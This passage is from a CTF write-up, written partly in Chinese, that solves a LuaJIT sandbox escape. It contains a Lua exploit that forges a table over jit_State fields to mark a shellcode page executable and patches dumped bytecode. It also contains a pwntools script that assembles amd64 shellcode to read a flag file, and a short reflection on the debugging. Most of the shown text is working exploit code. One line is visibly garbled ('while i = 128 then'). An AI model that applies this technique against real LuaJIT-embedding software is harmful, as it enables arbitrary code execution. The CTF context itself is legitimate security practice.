        -- the table's [0] through [4] fields allow access to the
        -- mcprot, mcarea, mctop, mcbot, and szmcarea fields of
        -- the jit_State. Note that LuaJIT allocates the empty
        -- string within global_State, so a fixed offset from the
        -- address of the empty string gives the fields we're
        -- after within jit_State.
        local mctab_s = "\0\0\0\0\99\4\0\0".. ub4(low32("") + 2748)
          .."\0\0\0\0\0\0\0\0\0\0\0\0\5\0\0\0\255\255\255\255"
        local mctab = low32(mctab_s) + 16 + 2^52
        mctab = -32757 -- Turned into KPRI(table)
        -- Construct a string consisting of 4096 x86 NOP instructions.
        --local nop4k = "\144"
        local nop4k = "\0"
        --[[
        local zeros = '\0'
        for i = 1, 12 do
            zeros = zeros .. zeros
        end
        --]]
        for i = 1, 12 do 
            nop4k = nop4k .. nop4k
        end
        -- Create a copy of the shellcode which is page aligned, and
        -- at least one page big, and obtain its address in "asaddr".
        local ashellcode = nop4k .. shellcode .. nop4k
        local asaddr = low32(ashellcode) + 16
        asaddr = asaddr + 2^12 - (asaddr % 2^12)
        --print(asaddr)
        --hexdump_print(0x100779f8, 0x30)
        -- The following seven lines result in the memory protection of
        -- the page at asaddr changing from read/write to read/execute.
        -- This is done by setting the jit_State::mcarea and szmcarea
        -- fields to specify the page in question, setting the mctop and
        -- mcbot fields to an empty subrange of said page, and then
        -- triggering some JIT compilation. As a somewhat unfortunate
        -- side-effect, the page at asaddr is added to the jit_State's
        -- linked-list of mcode areas (the shellcode unlinks it).
        local mcarea = mctab[1]
        mctab[0] = 0
        mctab[1] = asaddr / 2^52 / 2^1022
        mctab[2] = mctab[1]
        mctab[3] = mctab[1]
        mctab[4] = 2^12 / 2^52 / 2^1022
        while mctab[0] == 0 do end
        --[[
        local mcarea = mctab[1]
        --mctab[0] = 0xdeadbeef / 2^52 / 2^1022
        mctab[0] = 0
        mctab[1] = asaddr / 2^52 / 2^1022
        mctab[2] = mctab[1]
        mctab[3] = mctab[1]
        mctab[3] = 0xdeadbeef / 2^52 / 2^1022
        mctab[4] = 2^12 / 2^52 / 2^1022
        --while mctab[0] == 0 do end
        local i = 1
        while i = 128 then
        local sh = 7; v = v - 128
        repeat
          local r = p[0]
          v = v + bit.lshift(bit.band(r, 127), sh)
          sh = sh + 7
          p = p + 1
        until r < 128
      end
      return v
    end
    -- The dumped bytecode contains several prototypes: one for "evil"
    -- itself, and one for every (transitive) inner function. We step
    -- through each prototype in turn, and tweak some of them.
    while true do
      local len = read_uleb128()
      if len == 0 then break end
      local pend = p + len
      local flags, numparams, framesize, sizeuv = p[0], p[1], p[2], p[3]
      p = p + 4
      read_uleb128()
      read_uleb128()
      local sizebc = read_uleb128()
      local bc = p
      local uv = ffi.cast("uint16_t*", p + sizebc * 4)
      if numparams == 0 and sizeuv == 3 then
        -- This branch picks out the "inner" function.
        -- The first thing we do is change what the 0th upvalue
        -- points at:
        uv[0] = uv[0] + 2
        -- Then we go through and change everything which was written
        -- as "local_variable = -327XX" in the source to instead be
        -- a KPRI instruction:
        for i = 0, sizebc do
          if bc[0] == BC.KSHORT then
            local rd = ffi.cast("int16_t*", bc)[1]
            if rd <= -32749 then
              bc[0] = BC.KPRI
              bc[3] = 0
              if rd == -32749 then
                -- the `cdata = -32749` line in source also tweaks
                -- the two instructions after it:
                bc[4] = 0
                bc[8] = 0
              end
            end
          end
          bc = bc + 4
        end
      elseif sizebc == 1 then
        -- As written, the s_byte, s_char, and s_sub functions each
        -- contain a single "return" instruction. We replace said
        -- instruction with the corresponding fast-function instruction.
        bc[0] = 147 + numparams
        bc[2] = bit.band(1 + numparams, 6)
      end
      p = pend
    end
    function string.fromhex(str)
        return (str:gsub('..', function (cc)
            return string.char(tonumber(cc, 16))
        end))
    end
    function string.tohex(str)
        return (str:gsub('.', function (c)
            return string.format('%02X', string.byte(c))
    end))
    end
    res = string.tohex(ffi.string(buf, #estr))
    local f = io.open("../../shellcode.hex", "wb")
    f:write(ffi.string(res, #res))
    f:close()
    --print(res)
    --a = loadstring(string.fromhex(res))
    --print(a())
gen_shellcode.py
    from pwn import *
    context(arch='amd64', os='linux')
    shellcode = r'''
    pop rax
    sub rax, 0x71187
    mov rbp, rax
    add rax, 0x73370
    mov rdi, %s
    push rdi
    mov rdi, %s
    push rdi
    mov rdi, rsp
    push 0
    push 114
    mov rsi, rsp
    call rax
    mov rcx, rax
    mov rdi, rsp
    mov rsi, 100
    mov rdx, 100
    mov rax, rbp
    add rax, 0x733c0
    call rax
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 100
    mov rax, rbp
    add rax, 0x73510
    call rax
    push 0
    ret
    '''
    print(shellcode)
    shellcode = shellcode % (u64('a/flag'.ljust(8, '\x00')), u64('/pkg/dat'))
    with open('orig_exp.tpl.lua', 'r') as f:
        content = f.read()
        shellcode_hex = repr(asm(shellcode))
        content = content.replace('{SHELLCODE_TPL}', shellcode_hex)
        with open('orig_exp.lua', 'w') as f:
            f.write(content)
## 总结
好吧我其实当时调的过程原比现在描述的更加难受。最开始按照bt去还原的时候还没有去调试和看过luajit代码，只是去对照，看的非常费劲还分析错了，以为是zircon内无法使用jit导致的。
看来以后要多注意这个问题，有的背景知识还是需要多去熟悉一下才能够完整掌握。
调代码还是很有趣的，开源真好。还是要不断学习才做的动题目呀。